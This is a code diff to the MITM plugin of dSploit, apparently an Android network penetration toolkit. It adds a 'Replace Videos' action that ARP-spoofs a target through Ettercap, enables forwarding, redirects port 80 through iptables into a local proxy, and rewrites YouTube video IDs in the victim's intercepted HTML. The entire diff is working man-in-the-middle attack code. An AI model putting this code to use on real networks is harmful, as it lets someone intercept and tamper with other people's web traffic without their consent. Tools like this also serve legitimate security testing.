@@ -19,6 +19,7 @@
 package it.evilsocket.dsploit.plugins.mitm;
 
 import java.util.ArrayList;
+import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.regex.PatternSyntaxException;
 
@@ -50,11 +51,14 @@ import it.evilsocket.dsploit.gui.dialogs.FatalDialog;
 import it.evilsocket.dsploit.gui.dialogs.InputDialog;
 import it.evilsocket.dsploit.gui.dialogs.InputDialog.InputDialogListener;
 import it.evilsocket.dsploit.net.Target;
+import it.evilsocket.dsploit.net.http.proxy.Proxy;
+import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
 
 public class MITM extends Plugin 
 {
-	private static final String TAG 		   = "MITM";
-	private static final int    SELECT_PICTURE = 1010;
+	private static final String  TAG 		     = "MITM";
+	private static final int     SELECT_PICTURE  = 1010;
+	private static final Pattern YOUTUBE_PATTERN = Pattern.compile( "youtube\\.com/.*\\?v=([a-z0-9_-]+)", Pattern.CASE_INSENSITIVE );
 	
 	private ListView      	  mActionListView = null;
 	private ActionAdapter 	  mActionAdapter  = null;
@@ -347,6 +351,86 @@ public class MITM extends Plugin
 			    	activity.setVisibility( View.VISIBLE );
 
 					startActivityForResult( mImagePicker, SELECT_PICTURE );  
+				}
+				else
+				{					
+					HTTPFilter.stop( System.getProxy() );
+
+					activity.setVisibility( View.INVISIBLE );
+				}
+			}
+		}));
+        
+        mActions.add( new Action
+        (
+        	"Replace Videos", 
+        	"Replace all youtube videos on webpages with the specified one.", 
+        	R.drawable.action_youtube_48,
+        	new OnClickListener(){
+			@Override
+			public void onClick(View v) {
+				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );
+
+				if( activity.getVisibility() == View.INVISIBLE )
+				{
+					setStoppedState();
+					
+					new InputDialog
+					( 
+						"Video", 
+						"Enter the url of the video :", 
+						"http://www.youtube.com/watch?v=dQw4w9WgXcQ", 
+						true,
+						MITM.this, 
+						new InputDialogListener(){
+						@Override
+						public void onInputEntered( String input ) 
+						{
+							final String video = input.trim();
+							Matcher matcher = YOUTUBE_PATTERN.matcher( input );
+							
+							if( video.isEmpty() == false && matcher != null && matcher.find() )
+							{
+								final String videoId = matcher.group( 1 );
+								final Proxy  proxy	 = System.getProxy();
+								
+								activity.setVisibility( View.VISIBLE );
+								
+								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+												
+								System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
+									@Override
+									public void onReady() 
+									{
+										System.setForwarding( true );
+										
+										proxy.setFilter( new Proxy.ProxyFilter() {					
+											@Override
+											public String onHtmlReceived(String html) {												
+												if( html.matches( "(?s).+/v=[a-zA-Z0-9_-]+.+" ) )
+													html = html.replaceAll( "(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId );
+												
+												else if( html.matches( "(?s).+/v/[a-zA-Z0-9_-]+.+" ) )
+													html = html.replaceAll( "(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId );
+												
+												else if( html.matches( "(?s).+/embed/[a-zA-Z0-9_-]+.+" ) )
+													html = html.replaceAll( "(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId );										
+												
+												return html;
+											}
+										});
+										
+										new Thread( proxy ).start();
+										
+										System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
+									}
+									
+								}).start();												
+							}
+							else
+								new ErrorDialog( "Error", "Invalid youtube video.", MITM.this ).show();
+						}} 
+					).show();	
 				}
 				else
 				{					
